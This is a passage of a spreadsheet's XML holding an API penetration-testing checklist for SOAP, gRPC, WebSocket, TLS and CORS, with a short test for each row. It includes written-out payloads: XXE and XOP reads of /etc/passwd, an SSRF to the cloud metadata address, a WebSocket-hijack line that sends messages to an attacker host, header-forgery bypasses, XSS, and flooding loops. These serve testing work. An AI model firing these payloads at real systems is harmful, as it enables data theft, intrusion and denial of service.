    <t xml:space="preserve">{ __type(name: "User") { fields { name type { name } } } } | Iterate type names from clairvoyance output</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - GraphQL Security Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">API-11-001</t>
  </si>
  <si>
    <t xml:space="preserve">SOAP-specific</t>
  </si>
  <si>
    <t xml:space="preserve">WSDL exposure &amp; operation enumeration</t>
  </si>
  <si>
    <t xml:space="preserve">Retrieve the WSDL and extract all operations, bindings, and complex types. Often the WSDL exposes operations the UI never calls.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /service.asmx?WSDL | wsdler.py service.wsdl | SoapUI &gt; Import WSDL &gt; review operations tree</t>
  </si>
  <si>
    <t xml:space="preserve">API-11-002</t>
  </si>
  <si>
    <t xml:space="preserve">WS-Security timestamp replay</t>
  </si>
  <si>
    <t xml:space="preserve">WS-Security timestamps prevent replay only if validity windows are tight. Replay a signed message within the validity window. Re-sign via XSW for extended replay.</t>
  </si>
  <si>
    <t xml:space="preserve">Capture signed SOAP request | Replay within Timestamp/Expires window | WS-Attacker &gt; Timestamp Manipulation plugin</t>
  </si>
  <si>
    <t xml:space="preserve">ws-attacker.org</t>
  </si>
  <si>
    <t xml:space="preserve">API-11-003</t>
  </si>
  <si>
    <t xml:space="preserve">XSW on SOAP body</t>
  </si>
  <si>
    <t xml:space="preserve">Move the signed &lt;Body&gt; element to elsewhere in the envelope and inject an unsigned malicious &lt;Body&gt; that the service processes. XSW1-XSW8 are the standardized variants.</t>
  </si>
  <si>
    <t xml:space="preserve">WS-Attacker &gt; Signature Wrapping &gt; all XSW variants | SAML Raider for SAML-in-SOAP | Burp Repeater + manual XML editing</t>
  </si>
  <si>
    <t xml:space="preserve">ibm.com/think/topics/xml-signature-wrapping</t>
  </si>
  <si>
    <t xml:space="preserve">API-11-004</t>
  </si>
  <si>
    <t xml:space="preserve">SAML-in-SOAP assertion injection</t>
  </si>
  <si>
    <t xml:space="preserve">When SAML assertions are embedded in SOAP (WS-Trust, WS-Federation), perform XSW on the embedded assertion to inject admin claims.</t>
  </si>
  <si>
    <t xml:space="preserve">SAML Raider &gt; Send to XSW &gt; XSW7/XSW8 for embedded assertion | Manipulate the assertion's &lt;Subject&gt;&lt;NameID&gt; to admin</t>
  </si>
  <si>
    <t xml:space="preserve">arxiv.org/pdf/2106.10460</t>
  </si>
  <si>
    <t xml:space="preserve">API-11-005</t>
  </si>
  <si>
    <t xml:space="preserve">XXE in SOAP body</t>
  </si>
  <si>
    <t xml:space="preserve">SOAP endpoints process XML. XXE is often unprotected, especially in older WS stacks.</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;soap:Envelope&gt;&lt;soap:Body&gt;&lt;!DOCTYPE x [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;req&gt;&amp;xxe;&lt;/req&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">API-11-006</t>
  </si>
  <si>
    <t xml:space="preserve">SOAPAction header spoofing</t>
  </si>
  <si>
    <t xml:space="preserve">Mismatch SOAPAction header vs body operation. The gateway routes/authorizes based on SOAPAction while the backend executes based on body — enables authz bypass.</t>
  </si>
  <si>
    <t xml:space="preserve">SOAPAction: "GetPublicData" with body invoking AdminDeleteUser operation</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - SOAP testing</t>
  </si>
  <si>
    <t xml:space="preserve">API-11-007</t>
  </si>
  <si>
    <t xml:space="preserve">WS-Addressing manipulation</t>
  </si>
  <si>
    <t xml:space="preserve">Tamper with WS-Addressing ReplyTo, FaultTo, From headers. ReplyTo SSRF: server sends response/fault to attacker-controlled URL.</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;wsa:ReplyTo&gt;&lt;wsa:Address&gt;http://169.254.169.254/...&lt;/wsa:Address&gt;&lt;/wsa:ReplyTo&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">w3.org/Submission/ws-addressing</t>
  </si>
  <si>
    <t xml:space="preserve">API-11-008</t>
  </si>
  <si>
    <t xml:space="preserve">MTOM / XOP attachment attacks</t>
  </si>
  <si>
    <t xml:space="preserve">Abuse XOP Include for file read or SSRF via attachment references. Some parsers fetch the referenced cid: or http: URL.</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;xop:Include href="file:///etc/passwd"/&gt; | &lt;xop:Include href="http://internal/admin"/&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">w3.org/TR/xop10</t>
  </si>
  <si>
    <t xml:space="preserve">API-11-009</t>
  </si>
  <si>
    <t xml:space="preserve">WS-Trust token issues</t>
  </si>
  <si>
    <t xml:space="preserve">Forge or replay WS-Trust SecurityTokens, manipulate token-lifetime windows, or downgrade token types.</t>
  </si>
  <si>
    <t xml:space="preserve">Capture and replay SecurityTokenResponse | Modify &lt;wst:Lifetime&gt; to extend | Switch token types</t>
  </si>
  <si>
    <t xml:space="preserve">docs.oasis-open.org - WS-Trust</t>
  </si>
  <si>
    <t xml:space="preserve">API-11-010</t>
  </si>
  <si>
    <t xml:space="preserve">Insecure ID vs XPath signature referencing</t>
  </si>
  <si>
    <t xml:space="preserve">WS-Security signatures should reference signed elements via XPath, but most implementations use ID-based referencing (URI="#bodyID"). XSW exploits this.</t>
  </si>
  <si>
    <t xml:space="preserve">WS-Attacker XSW plugin exploits ID-based references | Verify &lt;ds:Reference&gt; URI pattern in signed messages</t>
  </si>
  <si>
    <t xml:space="preserve">API-11-011</t>
  </si>
  <si>
    <t xml:space="preserve">SOAP element fuzzing for legacy injection</t>
  </si>
  <si>
    <t xml:space="preserve">Older SOAP stacks are SQLi/cmd-injection vulnerable in element values. Wsfuzzer-style fuzzing still finds bugs.</t>
  </si>
  <si>
    <t xml:space="preserve">Tools: wsfuzzer, SoapUI Pro, custom Burp Intruder | Inject classic SQLi/cmdi payloads in each element</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - SOAP fuzzing</t>
  </si>
  <si>
    <t xml:space="preserve">API-11-012</t>
  </si>
  <si>
    <t xml:space="preserve">Schema poisoning</t>
  </si>
  <si>
    <t xml:space="preserve">Submit unexpected types or elements not in the WSDL schema. Lax validators may process them, exposing internal logic.</t>
  </si>
  <si>
    <t xml:space="preserve">Add unknown elements to body | Send xsi:type="AdminRequest" to base type | Mix element orderings</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - SOAP</t>
  </si>
  <si>
    <t xml:space="preserve">API-11-013</t>
  </si>
  <si>
    <t xml:space="preserve">SOAP oversized array DoS</t>
  </si>
  <si>
    <t xml:space="preserve">Submit enormous arrays in SOAP elements that get parsed eagerly into memory. Classic billion-laughs variant.</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;items&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lt;item&gt;..</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-001</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC-specific</t>
  </si>
  <si>
    <t xml:space="preserve">Reflection enabled in production</t>
  </si>
  <si>
    <t xml:space="preserve">Production gRPC services should disable reflection. If enabled, attackers enumerate every service, method, and message via grpcurl/grpcui.</t>
  </si>
  <si>
    <t xml:space="preserve">grpcurl -plaintext host:port list | grpcurl host:port describe &lt;Service&gt; | grpcui -plaintext host:port</t>
  </si>
  <si>
    <t xml:space="preserve">stackhawk.com/blog/best-practices-for-grpc-security</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-002</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC metadata auth bypass</t>
  </si>
  <si>
    <t xml:space="preserve">Call methods with no authorization metadata to find unauthenticated methods, or with a non-privileged token to find missing per-method auth.</t>
  </si>
  <si>
    <t xml:space="preserve">grpcurl -plaintext host:port AdminService/DeleteUser | (no auth header) | grpcurl -H 'authorization: Bearer &lt;user-token&gt;' ...</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-003</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC metadata header forgery</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC propagates HTTP/2 headers as metadata. Inject internal-trust headers (x-forwarded-for, internal: true, user_id: admin) to reach gated methods.</t>
  </si>
  <si>
    <t xml:space="preserve">grpcurl -H 'x-forwarded-for: 127.0.0.1' -H 'internal: true' -H 'user-id: admin' host:port Service/Method</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP gRPC Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-004</t>
  </si>
  <si>
    <t xml:space="preserve">Proto file leak / reverse engineering</t>
  </si>
  <si>
    <t xml:space="preserve">Recover .proto from public GitHub repos, mobile app bundles, or SDKs. Decode raw protobuf bytes with protoscope when schema is unknown.</t>
  </si>
  <si>
    <t xml:space="preserve">GH search: site:github.com filename:.proto target | protoscope -decode &lt; message.bin | grpc-tools</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-005</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC-web vs native protocol confusion</t>
  </si>
  <si>
    <t xml:space="preserve">Native gRPC uses HTTP/2 with content-type application/grpc; gRPC-Web uses application/grpc-web-text or +proto. Different handlers may apply different validation.</t>
  </si>
  <si>
    <t xml:space="preserve">Try both content-types against the same method | Test base64 (-text) vs binary (-proto) framing</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/grpc/grpc-web</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-006</t>
  </si>
  <si>
    <t xml:space="preserve">Interceptor chain bypass</t>
  </si>
  <si>
    <t xml:space="preserve">Auth via gRPC interceptors only protects methods registered with the interceptor. Find methods on services that skip the auth interceptor.</t>
  </si>
  <si>
    <t xml:space="preserve">Enumerate all methods | Test each without auth | Look for unauthenticated success on internal/debug methods</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-007</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC HTTP/2 Rapid Reset (CVE-2023-44487)</t>
  </si>
  <si>
    <t xml:space="preserve">Per NVD, CVE-2023-44487 is a DoS where request cancellation rapidly resets many streams. CVSS 7.5. The grpc-go fix (PR #6703, in v1.56.3) limits running handlers to MAX_CONCURRENT_STREAMS; golang.org/x/net/http2 defaults to 250.</t>
  </si>
  <si>
    <t xml:space="preserve">Test if MAX_CONCURRENT_STREAMS is enforced | Burst stream-open + immediate reset | Use grpc-attacker for PoC</t>
  </si>
  <si>
    <t xml:space="preserve">nvd.nist.gov/vuln/detail/CVE-2023-44487 | GHSA-m425-mq94-257g</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-008</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC MadeYouReset (CVE-2025-55163 / CVE-2025-8671)</t>
  </si>
  <si>
    <t xml:space="preserve">Published Aug 2025 in netty/netty. Per GHSA-prj3-ccx8-p6x4, affects io.grpc:grpc-netty-shaded &lt; 1.75.0 and io.netty:netty-codec-http2 ≤ 4.1.123.Final (also 4.2.0.Alpha1-4.2.3.Final). Patched in Netty 4.1.124.Final / 4.2.4.Final. Malformed control frames force the server to emit RST_STREAM, bypassing 100-stream-per-connection limits.</t>
  </si>
  <si>
    <t xml:space="preserve">Verify grpc-netty-shaded &lt; 1.75.0 or netty-codec-http2 &lt; 4.1.124 | Send malformed control frames triggering server RST_STREAM</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/advisories/GHSA-prj3-ccx8-p6x4</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-009</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC HPACK table poisoning (CVE-2024-7246)</t>
  </si>
  <si>
    <t xml:space="preserve">A gRPC client via an HTTP/2 proxy can poison the HPACK table between the proxy and the backend, causing other clients' requests to fail and leaking other clients' header keys (grpc C-core/C++).</t>
  </si>
  <si>
    <t xml:space="preserve">Verify grpc C-core version &lt; fixed | Test with multiplexed clients through a shared proxy</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/grpc/grpc/security/advisories</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-010</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC zero-copy data corruption DoS (CVE-2024-11407)</t>
  </si>
  <si>
    <t xml:space="preserve">Servers with GRPC_ARG_TCP_TX_ZEROCOPY_ENABLED can corrupt transmitted data, causing RPC failures.</t>
  </si>
  <si>
    <t xml:space="preserve">Check server config for TCP zero-copy enablement | Trigger large message transmissions</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-011</t>
  </si>
  <si>
    <t xml:space="preserve">protobuf-java nested-message recursion DoS (CVE-2024-7254)</t>
  </si>
  <si>
    <t xml:space="preserve">Per Google's GitHub Advisory (CVSS 4.0 8.7 High, CWE-20): parsing nested groups as unknown fields with DiscardUnknownFieldsParser or Java Protobuf Lite parser, or against Protobuf map fields, creates unbounded recursions. Fixed in protobuf-java 3.25.5 / 4.27.5 / 4.28.2.</t>
  </si>
  <si>
    <t xml:space="preserve">Verify protobuf-java &lt; 3.25.5 or 4.27.5/4.28.2 | Craft deeply nested unknown groups</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/advisories - protobuf-java</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-012</t>
  </si>
  <si>
    <t xml:space="preserve">HTTP/2 CONTINUATION flood (CVE-2023-45288 / GO-2024-2687)</t>
  </si>
  <si>
    <t xml:space="preserve">Affects grpc-go servers transitively via golang.org/x/net. Fixed in golang.org/x/net v0.23.0. Attacker floods CONTINUATION frames to exhaust the server.</t>
  </si>
  <si>
    <t xml:space="preserve">Verify golang.org/x/net &lt; 0.23.0 | Tool: github.com/bombardier-gun/h2c-fuzzer</t>
  </si>
  <si>
    <t xml:space="preserve">pkg.go.dev/vuln/GO-2024-2687</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-013</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC deadline / timeout manipulation</t>
  </si>
  <si>
    <t xml:space="preserve">Set extremely long deadlines (grpc-timeout: 9999999H) to pin resources. Or set zero timeout to test edge cases.</t>
  </si>
  <si>
    <t xml:space="preserve">grpcurl -H 'grpc-timeout: 9999999H' ... | Or 0n, 1u | Look for resource exhaustion</t>
  </si>
  <si>
    <t xml:space="preserve">grpc.io/docs/guides/deadlines</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-014</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC error-code information leak</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC status codes and error messages frequently leak internal state, file paths, and stack traces — more verbose than HTTP status codes alone.</t>
  </si>
  <si>
    <t xml:space="preserve">Force errors: invalid messages, missing fields, oversized payloads | Read returned status detail / trailers</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-015</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC TLS / plaintext misconfiguration</t>
  </si>
  <si>
    <t xml:space="preserve">Test whether the production endpoint accepts -plaintext (no TLS). Many services accept both for backward compatibility.</t>
  </si>
  <si>
    <t xml:space="preserve">grpcurl -plaintext host:443 list | grpcurl host:443 list (TLS) | Compare behavior</t>
  </si>
  <si>
    <t xml:space="preserve">API-12-016</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC channel-credential bypass</t>
  </si>
  <si>
    <t xml:space="preserve">Connect without channel credentials when the service expects them. Test if the server actually enforces credential presence on each method.</t>
  </si>
  <si>
    <t xml:space="preserve">Connect without -cert/-key | Connect with self-signed cert | Look for accepted plaintext connection</t>
  </si>
  <si>
    <t xml:space="preserve">grpc.io - authentication</t>
  </si>
  <si>
    <t xml:space="preserve">API-13-001</t>
  </si>
  <si>
    <t xml:space="preserve">WebSocket-specific</t>
  </si>
  <si>
    <t xml:space="preserve">Cross-Site WebSocket Hijacking (CSWSH)</t>
  </si>
  <si>
    <t xml:space="preserve">Handshake relies only on cookie auth with no Origin check or CSRF token. Build a malicious page that opens cross-site WS in victim's session and reads/sends messages.</t>
  </si>
  <si>
    <t xml:space="preserve">Attacker page: var ws = new WebSocket('wss://target/ws'); ws.onmessage = e =&gt; fetch('//attacker/'+e.data) | Real-world: CVE-2024-26135 (MeshCentral admin compromise)</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/websockets/cross-site-websocket-hijacking | praetorian.com - MeshCentral</t>
  </si>
  <si>
    <t xml:space="preserve">API-13-002</t>
  </si>
  <si>
    <t xml:space="preserve">Auth at connection vs per-message</t>
  </si>
  <si>
    <t xml:space="preserve">Auth on the WS handshake but no per-message auth. After connecting (even as low-priv), send messages targeting privileged operations.</t>
  </si>
  <si>
    <t xml:space="preserve">Connect as user-A | Send: {"action":"admin_delete","target":"user-B"} | Test all message types</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP WebSocket Security Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">API-13-003</t>
  </si>
  <si>
    <t xml:space="preserve">Message-level injection (XSS/SQLi)</t>
  </si>
  <si>
    <t xml:space="preserve">Message payloads typically render in the UI without HTML encoding (chat apps especially). XSS via message content; SQLi via message-data sent server-side.</t>
  </si>
  <si>
    <t xml:space="preserve">Edit chat message: &lt;img src=1 onerror=alert(1)&gt; | SQLi in message field that's saved to DB</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - WebSocket security</t>
  </si>
  <si>
    <t xml:space="preserve">API-13-004</t>
  </si>
  <si>
    <t xml:space="preserve">Subprotocol negotiation abuse</t>
  </si>
  <si>
    <t xml:space="preserve">Manipulate Sec-WebSocket-Protocol header. Some apps treat protocol values as trust signals (e.g., admin subprotocol).</t>
  </si>
  <si>
    <t xml:space="preserve">Sec-WebSocket-Protocol: admin | Sec-WebSocket-Protocol: internal-v1</t>
  </si>
  <si>
    <t xml:space="preserve">RFC 6455 §4</t>
  </si>
  <si>
    <t xml:space="preserve">API-13-005</t>
  </si>
  <si>
    <t xml:space="preserve">Connection-flood DoS</t>
  </si>
  <si>
    <t xml:space="preserve">Open many simultaneous connections with no per-IP/per-account connection limit. Each connection consumes server-side memory.</t>
  </si>
  <si>
    <t xml:space="preserve">for i in $(seq 1 10000); do (websocat wss://target/ws &amp;); done | Or: looped JS in browser</t>
  </si>
  <si>
    <t xml:space="preserve">API-13-006</t>
  </si>
  <si>
    <t xml:space="preserve">Large-message DoS</t>
  </si>
  <si>
    <t xml:space="preserve">Send messages much larger than the application expects. No max-message-size = memory exhaustion.</t>
  </si>
  <si>
    <t xml:space="preserve">while(true) ws.send('A'.repeat(10000000)) | Verify max-message-size enforcement</t>
  </si>
  <si>
    <t xml:space="preserve">API-13-007</t>
  </si>
  <si>
    <t xml:space="preserve">Per-message-deflate compression bomb</t>
  </si>
  <si>
    <t xml:space="preserve">Compressed frame inflates to massive memory. Real CVEs include NATS CVE-2026-27571 and undici WS client. Mitigate by disabling permessage-deflate unless needed.</t>
  </si>
  <si>
    <t xml:space="preserve">Generate 1KB compressed frame that inflates to 1GB | Use python websockets library with custom deflate</t>
  </si>
  <si>
    <t xml:space="preserve">API-13-008</t>
  </si>
  <si>
    <t xml:space="preserve">WebSocket smuggling</t>
  </si>
  <si>
    <t xml:space="preserve">Proxy and backend disagree on handshake success. Proxy holds the TCP connection open while attacker tunnels raw HTTP to backend-only endpoints.</t>
  </si>
  <si>
    <t xml:space="preserve">Send malformed Upgrade response | Tunnel HTTP/1.1 GET /internal HTTP/1.1\r\n... via the persistent connection</t>
  </si>
  <si>
    <t xml:space="preserve">clear-gate.com/blog/websocket-misconfigurations</t>
  </si>
  <si>
    <t xml:space="preserve">API-13-009</t>
  </si>
  <si>
    <t xml:space="preserve">ws:// downgrade / mixed-content</t>
  </si>
  <si>
    <t xml:space="preserve">Unencrypted ws:// leaks tokens and messages. Test whether wss:// is enforced server-side, not just defaulted in client code.</t>
  </si>
  <si>
    <t xml:space="preserve">Direct connect: ws://target/ws | Strip TLS in client config | Verify cookies/tokens not sent over plaintext</t>
  </si>
  <si>
    <t xml:space="preserve">API-13-010</t>
  </si>
  <si>
    <t xml:space="preserve">Broadcast message leakage</t>
  </si>
  <si>
    <t xml:space="preserve">WS apps that broadcast messages (chat, notifications) may send other users' broadcast content to your connection.</t>
  </si>
  <si>
    <t xml:space="preserve">Connect as user-A | Watch all incoming messages | Filter for sensitive data from other users</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - WebSocket</t>
  </si>
  <si>
    <t xml:space="preserve">API-13-011</t>
  </si>
  <si>
    <t xml:space="preserve">Hidden binary-frame / fragmentation abuse</t>
  </si>
  <si>
    <t xml:space="preserve">Fuzz binary opcodes (0x2) and fragmented frames (FIN bit handling). Edge cases may crash parsers or bypass message validation.</t>
  </si>
  <si>
    <t xml:space="preserve">Tool: ws-fuzzer | Custom opcodes 0x3-0x7 (reserved) | Fragmented control frames | Continuation without preceding text/binary</t>
  </si>
  <si>
    <t xml:space="preserve">RFC 6455 §5</t>
  </si>
  <si>
    <t xml:space="preserve">API-13-012</t>
  </si>
  <si>
    <t xml:space="preserve">SameSite cookie bypass for CSWSH</t>
  </si>
  <si>
    <t xml:space="preserve">Default SameSite=Lax blocks most cross-site WS. SameSite=None or a subdomain XSS defeats this. Firefox Total Cookie Protection blocks many CSWSH attempts.</t>
  </si>
  <si>
    <t xml:space="preserve">Check cookie SameSite attribute | Test from a known XSS on subdomain | Test cross-browser</t>
  </si>
  <si>
    <t xml:space="preserve">blackhillsinfosec.com - WS hijacking</t>
  </si>
  <si>
    <t xml:space="preserve">API-13-013</t>
  </si>
  <si>
    <t xml:space="preserve">Two-way data exfiltration via hijack</t>
  </si>
  <si>
    <t xml:space="preserve">Once a CSWSH connection is hijacked, both read server-pushed messages (sensitive data) and send authenticated actions (state changes).</t>
  </si>
  <si>
    <t xml:space="preserve">On hijacked socket: ws.send({action:'transfer',...}) | ws.onmessage = e =&gt; exfil(e.data)</t>
  </si>
  <si>
    <t xml:space="preserve">API-14-001</t>
  </si>
  <si>
    <t xml:space="preserve">Cryptography &amp; Transport</t>
  </si>
  <si>
    <t xml:space="preserve">Weak cipher / old TLS protocol</t>
  </si>
  <si>
    <t xml:space="preserve">TLS configurations supporting SSLv3, TLS 1.0/1.1, RC4, 3DES, or weak DH groups. Test for downgrade attacks.</t>
  </si>
  <si>
    <t xml:space="preserve">testssl.sh https://api.target.com | nmap --script ssl-enum-ciphers -p 443 api.target.com</t>
  </si>
  <si>
    <t xml:space="preserve">testssl.sh</t>
  </si>
  <si>
    <t xml:space="preserve">API-14-002</t>
  </si>
  <si>
    <t xml:space="preserve">Certificate validation issues</t>
  </si>
  <si>
    <t xml:space="preserve">Server accepts self-signed, expired, or wrong-hostname certs. Mobile clients often miss certificate pinning.</t>
  </si>
  <si>
    <t xml:space="preserve">openssl s_client -connect api.target.com:443 | Frida cert pinning bypass on mobile</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP TLS Cheat Sheet</t>
  </si>
  <si>
    <t xml:space="preserve">API-14-003</t>
  </si>
  <si>
    <t xml:space="preserve">HSTS missing or misconfigured</t>
  </si>
  <si>
    <t xml:space="preserve">No Strict-Transport-Security header allows downgrade attacks. Missing includeSubDomains exposes API subdomains.</t>
  </si>
  <si>
    <t xml:space="preserve">curl -I https://api.target.com | grep -i strict-transport-security | Test value: max-age, includeSubDomains, preload</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - HSTS</t>
  </si>
  <si>
    <t xml:space="preserve">API-14-004</t>
  </si>
  <si>
    <t xml:space="preserve">Predictable token generation</t>
  </si>
  <si>
    <t xml:space="preserve">Tokens generated from weak RNG, timestamps, or sequential counters. Test entropy with statistical analysis.</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Sequencer &gt; Live capture &gt; &gt;=1000 samples | Analyze with NIST STS or randomness tests</t>
  </si>
  <si>
    <t xml:space="preserve">API-14-005</t>
  </si>
  <si>
    <t xml:space="preserve">Cleartext sensitive data in responses</t>
  </si>
  <si>
    <t xml:space="preserve">API returns PII, payment data, secrets in plaintext. Some compliance regimes require server-side encryption-at-rest visible in response shape.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /v1/users/me | Check for: ssn, full_credit_card, password_hash, internal_api_keys</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Sensitive Data Exposure</t>
  </si>
  <si>
    <t xml:space="preserve">API-14-006</t>
  </si>
  <si>
    <t xml:space="preserve">Mixed HTTP/HTTPS endpoints</t>
  </si>
  <si>
    <t xml:space="preserve">Some endpoints served over HTTP while main API is HTTPS. Common during migrations or for legacy endpoints.</t>
  </si>
  <si>
    <t xml:space="preserve">Iterate endpoint list against both http:// and https:// | Check 301 vs 200 response patterns</t>
  </si>
  <si>
    <t xml:space="preserve">API-14-007</t>
  </si>
  <si>
    <t xml:space="preserve">Weak encryption of stored API keys</t>
  </si>
  <si>
    <t xml:space="preserve">API keys stored with reversible/weak encryption or weak hashing at rest. Discovery via DB access, error messages, or SSRF.</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze any key/token field shape: padded base64 = AES-ECB; equals signs alone = weak | Crack if recovered</t>
  </si>
  <si>
    <t xml:space="preserve">API-14-008</t>
  </si>
  <si>
    <t xml:space="preserve">JWE algorithm confusion</t>
  </si>
  <si>
    <t xml:space="preserve">Encrypted JWTs (JWE) support multiple algorithms. Downgrade enc to 'none' or to a vulnerable algorithm.</t>
  </si>
  <si>
    <t xml:space="preserve">jwt_tool.py -X jwe-downgrade | Modify alg/enc fields in JWE protected header</t>
  </si>
  <si>
    <t xml:space="preserve">RFC 7516 | portswigger.net/web-security/jwt</t>
  </si>
  <si>
    <t xml:space="preserve">API-14-009</t>
  </si>
  <si>
    <t xml:space="preserve">CBC padding oracle on tokens</t>
  </si>
  <si>
    <t xml:space="preserve">Encrypted tokens using AES-CBC without integrity check (e.g., AES-CBC without HMAC). Bit-flipping attacks decrypt and forge.</t>
  </si>
  <si>
    <t xml:space="preserve">Tool: padbuster, Vaudenay's padding oracle | Test if modified ciphertext changes error vs success</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org - Padding Oracle</t>
  </si>
  <si>
    <t xml:space="preserve">API-14-010</t>
  </si>
  <si>
    <t xml:space="preserve">BREACH/CRIME on compressed responses</t>
  </si>
  <si>
    <t xml:space="preserve">Secrets in HTTPS responses leak via compression-aware attacks when attacker can inject text and observe response size.</t>
  </si>
  <si>
    <t xml:space="preserve">Inject candidate prefix in user-controlled field | Measure response size | Bit-by-bit secret extraction | Also relevant to WS permessage-deflate</t>
  </si>
  <si>
    <t xml:space="preserve">breachattack.com</t>
  </si>
  <si>
    <t xml:space="preserve">API-15-001</t>
  </si>
  <si>
    <t xml:space="preserve">CORS &amp; Headers</t>
  </si>
  <si>
    <t xml:space="preserve">Reflected origin with credentials</t>
  </si>
  <si>
    <t xml:space="preserve">Access-Control-Allow-Origin reflects the Origin header verbatim, and Access-Control-Allow-Credentials: true. Cross-origin attacker can read authenticated responses.</t>
  </si>
  <si>
    <t xml:space="preserve">curl -H 'Origin: https://attacker.com' -I https://api.target.com/v1/users/me | Look for ACAO: https://attacker.com + ACAC: true</t>
  </si>
  <si>
    <t xml:space="preserve">API-15-002</t>
  </si>
  <si>
    <t xml:space="preserve">Wildcard ACAO on authenticated API</t>
  </si>
  <si>
    <t xml:space="preserve">Access-Control-Allow-Origin: * combined with cookie or token auth. Browsers block credentialed wildcard, but bearer-only APIs are still exposed.</t>
  </si>
  <si>
    <t xml:space="preserve">Check for ACAO: * on endpoints returning user data | Often paired with bearer-token auth</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - CORS</t>
  </si>
  <si>
    <t xml:space="preserve">API-15-003</t>
  </si>
  <si>
    <t xml:space="preserve">Null origin abuse</t>
  </si>
  <si>
    <t xml:space="preserve">Access-Control-Allow-Origin accepts Origin: null. Sandboxed iframes and data: URLs have null origin and can read authenticated responses.</t>
  </si>
  <si>
    <t xml:space="preserve">curl -H 'Origin: null' -I https://api.target.com/v1/users/me | Exploit via &lt;iframe sandbox srcdoc='...'&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">API-15-004</t>
  </si>
  <si>
    <t xml:space="preserve">CORS preflight bypass via simple requests</t>
  </si>
  <si>
    <t xml:space="preserve">Simple requests (GET/POST with text/plain, application/x-www-form-urlencoded) skip preflight. State-changing endpoints accepting these bypass CORS protection.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/transfer Content-Type: text/plain Body: {"to":"attacker"} | No preflight = no Origin check</t>
  </si>
  <si>
    <t xml:space="preserve">developer.mozilla.org/CORS#simple_requests</t>
  </si>
  <si>
    <t xml:space="preserve">API-15-005</t>
  </si>
  <si>
    <t xml:space="preserve">Loose subdomain / regex CORS</t>
  </si>
  <si>
    <t xml:space="preserve">Origin validators using overly-loose regexes (.*target.com.*) match evil-target.com.attacker.com.</t>
  </si>
  <si>
    <t xml:space="preserve">Test: target.com.attacker.com | attacker.com/target.com | nottarget.com</t>
  </si>
  <si>
    <t xml:space="preserve">API-15-006</t>
  </si>
  <si>
    <t xml:space="preserve">Missing security headers on API</t>
  </si>
  <si>
    <t xml:space="preserve">API responses missing X-Content-Type-Options, X-Frame-Options, CSP. Especially relevant for API consoles, Swagger UI, GraphQL playground served from API domain.</t>
  </si>
  <si>
    <t xml:space="preserve">curl -I https://api.target.com/v1/data | Check for X-Content-Type-Options: nosniff, X-Frame-Options, Content-Security-Policy</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Secure Headers Project</t>
  </si>
  <si>
    <t xml:space="preserve">API-15-007</t>
  </si>
  <si>
    <t xml:space="preserve">Cache poisoning via unkeyed CORS headers</t>
  </si>
  <si>
    <t xml:space="preserve">Cache key omits Origin while CORS headers vary by Origin. Poisoned cache entry serves attacker-origin ACAO to all users.</t>
  </si>
  <si>
    <t xml:space="preserve">Send request with attacker Origin, response cached with attacker ACAO | Next victim gets cached response</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/research/practical-web-cache-poisoning</t>
  </si>
  <si>
